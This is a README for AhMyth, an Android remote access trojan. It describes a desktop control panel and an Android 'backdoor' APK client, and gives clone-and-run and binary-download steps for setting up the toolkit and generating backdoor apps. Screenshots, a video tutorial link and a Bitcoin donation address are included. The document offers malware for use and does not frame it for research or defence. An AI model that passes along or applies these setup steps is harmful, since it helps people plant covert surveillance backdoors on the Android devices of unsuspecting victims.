# AhMyth Android Rat
###### Beta Version
It consists of two parts :
* Server side : desktop application based on electron framework (control panel)
* Client side : android application (backdoor)


## Getting Started
### You have two options to install it
#### 1) From source code
###### Prerequisite :
* Electron (to start the app)
* Java (to generate apk backdoor)
* Electron-builder and electron-packer (to build binaries for (OSX,WINDOWS,LINUX))
1. ```git clone https://github.com/AhMyth/AhMyth-Android-RAT.git```
2. ```cd AhMyth-Android-RAT/AhMyth-Server```
3. ```npm start```

#### 2) From binaries
###### Prerequisite :
* Download a binary from https://github.com/AhMyth/AhMyth-Android-RAT/releases
* Java (to generate apk backdoor)

## Screenshots
<p align="center">
  <img src="http://i.imgur.com/HM3uXL6.png" width="600"/>
</p>

---------------------------------------------------------------

<p align="center">
  <img src="http://i.imgur.com/nHTGGHi.png" width="600"/>
</p>

---------------------------------------------------------------

<p align="center">
  <img src="http://i.imgur.com/XVXCHV9.png" width="600"/>
</p>


## Video Tutorial
<p align="center">
<a href="https://www.youtube.com/watch?v=DDIZTABABzs">
  <img src="https://img.youtube.com/vi/DDIZTABABzs/0.jpg" width="600"/>
</a></p>


---------------------------------------------------------------
###### Twitter : <a href="https://twitter.com/AhMythDev"> @AhMythDev </a>
###### Bitcoin address for donations:  : 1EVwLuwmbsEuej7qJnNquFeQJLsgd2b8Lq
